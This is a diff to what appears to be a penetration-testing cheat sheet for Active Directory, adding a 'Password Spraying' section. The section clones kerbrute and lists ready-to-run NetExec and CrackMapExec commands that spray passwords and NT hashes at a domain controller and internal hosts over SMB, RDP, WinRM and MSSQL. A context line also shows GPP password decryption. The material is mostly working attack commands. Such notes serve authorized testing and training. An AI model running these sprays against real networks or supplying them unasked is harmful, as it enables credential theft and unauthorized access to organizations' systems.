@@ -179,7 +179,40 @@ gpp-decrypt F7HV9AXdOSpNAXTDhwZt0atMg6S/Q0TOnyGDYMIzL7o ​
 ```
 ### Password Spraying
 ```shell
+# kerbrute.py
+git clone https://github.com/TarlogicSecurity/kerbrute.git
+cd kerbrute
+python3 kerbrute.py -users usernames.txt -passwords passwords.txt -dc-ip 172.16.150.10 -domain vorkharium.com
 
+# NetExec
+# Password Spraying
+nxc smb 172.16.150.10 -u john -p passwords.txt
+nxc smb 172.16.150.10 -u usernames.txt -p 'Password123!'
+nxc smb internal_ips.txt -u usernames.txt -p passwords.txt --continue-on-success
+
+# Hash Spraying
+nxc smb 172.16.150.10 -u john -H NT_hashes.txt
+nxc smb 172.16.150.10 -u usernames.txt -H 'NT_HASH'
+nxc smb internal_ips.txt -u usernames.txt -H NT_hashes.txt --continue-on-success
+
+# Local Authentication
+nxc smb 172.16.150.10 -u john -p 'Password123!' --local-auth
+nxc smb 172.16.150.10 -u domain_users.txt -p passwords_found.txt --local-auth
+
+# RDP
+nxc rdp ips_internal.txt -u john -p 'Password123!' --continue-on-success
+nxc rdp ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth
+
+# WinRM
+nxc winrm ips_internal.txt -u john -p 'Password123!' --continue-on-success
+nxc winrm ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth
+
+# MSSQL
+nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success
+nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth
+
+# We can also use CrackMapExec running almost the same commands replacing "nxc" for "crackmapexec". For example:
+crackmapexec smb 172.16.150.10 -u john -p passwords.txt
 ```
 ### Local PowerShell Enumeration
 ```shell
